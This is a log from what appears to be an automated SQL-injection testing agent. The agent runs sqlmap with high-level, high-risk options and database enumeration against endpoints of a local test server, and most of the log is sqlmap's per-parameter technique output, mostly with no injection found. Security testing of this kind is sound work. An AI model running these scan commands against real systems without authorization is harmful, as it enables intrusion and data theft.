INFO - [20:25:27] [WARNING] false positive or unexploitable injection point detected
INFO - [20:25:27] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
INFO - [20:25:27] [INFO] testing if parameter 'User-Agent' is dynamic
INFO - [20:25:27] [WARNING] parameter 'User-Agent' does not appear to be dynamic
INFO - [20:25:27] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
INFO - [20:25:27] [INFO] testing for SQL injection on parameter 'User-Agent'
INFO - [20:25:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:25:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:25:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:25:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:25:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:25:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:25:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:25:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:25:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:25:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:25:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:25:35] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:25:35] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:25:35] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:25:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:25:36] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:25:38] [WARNING] parameter 'User-Agent' does not seem to be injectable
INFO - [20:25:38] [INFO] testing if parameter 'Referer' is dynamic
INFO - [20:25:38] [WARNING] parameter 'Referer' does not appear to be dynamic
INFO - [20:25:38] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
INFO - [20:25:38] [INFO] testing for SQL injection on parameter 'Referer'
INFO - [20:25:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:25:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:25:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:25:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:25:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:25:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:25:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:25:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:25:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:25:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:25:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:25:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:25:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:25:43] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:25:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:25:44] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:25:46] [WARNING] parameter 'Referer' does not seem to be injectable
INFO - [20:25:46] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:25:46] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:25:46] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:25:46] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:25:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:25:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:25:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:25:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:25:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:25:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:25:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:25:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:25:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:25:50] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:25:50] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:25:50] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:25:50] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:25:50] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:25:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:25:51] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:25:52] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:25:52] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:25:52] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 3452 times, 404 (Not Found) - 4 times
INFO - [*] ending @ 20:25:52 /2025-09-26/
WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Get_orders_for_a_user_discovery.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders/test --output-dir 'attack-logs-dynamic\Get_orders_for_a_user_sqlmap' --batch --level=5 --risk=3 --threads 5 --dbs
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:26:01 /2025-09-26/
INFO - [20:26:08] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_orders_for_a_user_sqlmap' as the output directory
INFO - [20:26:09] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:26:09] [INFO] testing connection to the target URL
INFO - [20:26:09] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:26:09] [INFO] testing if the target URL content is stable
INFO - [20:26:10] [INFO] target URL content is stable
INFO - [20:26:10] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:26:10] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:26:10] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:26:10] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:26:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:26:10] [WARNING] reflective value(s) found and filtering out
INFO - [20:26:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:26:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:26:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:26:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:26:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:26:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:26:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:26:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:26:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:26:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:26:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:26:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:26:33] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:26:34] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:26:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:26:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:26:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:26:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:26:41] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:26:42] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:26:43] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:26:45] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:26:46] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:26:47] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:26:47] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:26:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:26:49] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:26:49] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:26:49] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:26:49] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:26:49] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:26:49] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:26:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:26:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:26:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:26:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:26:49] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:26:49] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:26:49] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable
INFO - it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
INFO - [20:26:49] [INFO] testing 'Generic inline queries'
INFO - [20:26:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
INFO - [20:26:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
INFO - [20:26:49] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
INFO - [20:26:50] [INFO] target URL appears to be UNION injectable with 6 columns
INFO - [20:26:50] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
INFO - [20:26:50] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
INFO - [20:26:50] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
INFO - [20:26:50] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
INFO - [20:26:51] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
INFO - [20:26:51] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
INFO - [20:26:51] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
INFO - [20:26:51] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
INFO - [20:26:51] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
INFO - [20:26:52] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
INFO - [20:26:52] [WARNING] false positive or unexploitable injection point detected
INFO - [20:26:52] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
INFO - [20:26:52] [INFO] testing if parameter 'User-Agent' is dynamic
INFO - [20:26:52] [WARNING] parameter 'User-Agent' does not appear to be dynamic
INFO - [20:26:52] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
INFO - [20:26:52] [INFO] testing for SQL injection on parameter 'User-Agent'
INFO - [20:26:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:26:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:26:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:26:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:26:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:26:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:26:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:26:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:26:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:26:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:26:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:26:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:26:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:26:55] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:26:55] [INFO] testing 'Generic inline queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:26:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:26:56] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:26:56] [WARNING] parameter 'User-Agent' does not seem to be injectable
INFO - [20:26:56] [INFO] testing if parameter 'Referer' is dynamic
INFO - [20:26:56] [WARNING] parameter 'Referer' does not appear to be dynamic
INFO - [20:26:56] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
INFO - [20:26:56] [INFO] testing for SQL injection on parameter 'Referer'
INFO - [20:26:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:26:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:26:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:26:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:26:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:26:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:26:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:26:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:26:59] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:26:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:26:59] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:26:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:26:59] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:26:59] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:26:59] [INFO] testing 'Generic inline queries'
INFO - [20:26:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:27:00] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:27:00] [WARNING] parameter 'Referer' does not seem to be injectable
INFO - [20:27:00] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:27:00] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:27:00] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:27:00] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:27:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:27:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:27:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:27:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:27:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:27:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:27:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:27:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:27:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:27:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:27:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:27:03] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:27:03] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:27:03] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:27:03] [INFO] testing 'Generic inline queries'
INFO - [20:27:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:27:05] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:27:05] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:27:05] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:27:05] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 3455 times, 404 (Not Found) - 4 times
INFO - [*] ending @ 20:27:05 /2025-09-26/
WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Get_orders_for_a_user_dbs.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/reviews -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}'
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:27:10 /2025-09-26/
INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
INFO - [20:27:13] [INFO] flushing session file
INFO - [20:27:13] [INFO] testing connection to the target URL
INFO - [20:27:14] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:27:14] [INFO] testing if the target URL content is stable
INFO - [20:27:15] [INFO] target URL content is stable
INFO - [20:27:15] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
INFO - [20:27:15] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
INFO - [20:27:15] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
INFO - [20:27:15] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
INFO - [20:27:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:27:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:27:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:27:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:27:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:27:16] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:27:16] [INFO] testing 'Generic inline queries'
INFO - [20:27:16] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:27:16] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:27:16] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:27:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:27:16] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:27:16] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:27:16] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:27:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:27:16] [WARNING] reflective value(s) found and filtering out
INFO - [20:27:16] [WARNING] (custom) POST parameter 'JSON product_id' does not seem to be injectable
INFO - [20:27:16] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
INFO - [20:27:17] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
INFO - [20:27:17] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
INFO - [20:27:17] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
INFO - [20:27:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:27:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:27:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:27:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:27:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:27:17] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:27:17] [INFO] testing 'Generic inline queries'
INFO - [20:27:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:27:18] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:27:18] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:27:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:27:18] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:27:18] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:27:18] [INFO] testing 'Oracle AND time-based blind'
INFO - [20:27:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:27:18] [WARNING] (custom) POST parameter 'JSON user_id' does not seem to be injectable
INFO - [20:27:18] [INFO] testing if (custom) POST parameter 'JSON review' is dynamic
INFO - [20:27:19] [WARNING] (custom) POST parameter 'JSON review' does not appear to be dynamic
INFO - [20:27:19] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON review' might not be injectable
INFO - [20:27:19] [INFO] testing for SQL injection on (custom) POST parameter 'JSON review'
INFO - [20:27:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:27:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:27:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:27:21] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:27:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:27:22] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:27:23] [INFO] testing 'Generic inline queries'
INFO - [20:27:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:27:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:27:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:27:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:27:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:27:25] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:27:25] [INFO] testing 'Oracle AND time-based blind'
INFO - [20:27:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:27:27] [WARNING] (custom) POST parameter 'JSON review' does not seem to be injectable
INFO - [20:27:27] [INFO] testing if (custom) POST parameter 'JSON rating' is dynamic
INFO - [20:27:27] [WARNING] (custom) POST parameter 'JSON rating' does not appear to be dynamic
INFO - [20:27:27] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON rating' might not be injectable
INFO - [20:27:27] [INFO] testing for SQL injection on (custom) POST parameter 'JSON rating'
INFO - [20:27:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:27:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:27:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:27:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:27:27] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:27:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:27:28] [INFO] testing 'Generic inline queries'
INFO - [20:27:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:27:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:27:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:27:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:27:28] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:27:28] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:27:28] [INFO] testing 'Oracle AND time-based blind'
INFO - [20:27:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:27:28] [WARNING] (custom) POST parameter 'JSON rating' does not seem to be injectable
INFO - [20:27:28] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:27:28] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 233 times
INFO - [*] ending @ 20:27:28 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/reviews (log: attack-logs-dynamic\Add_a_review_for_a_product_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews --output-dir 'attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"product_id": "1", "user_id": "1", "review": "test", "rating": "1"}' --technique BU
INFO -        __H__
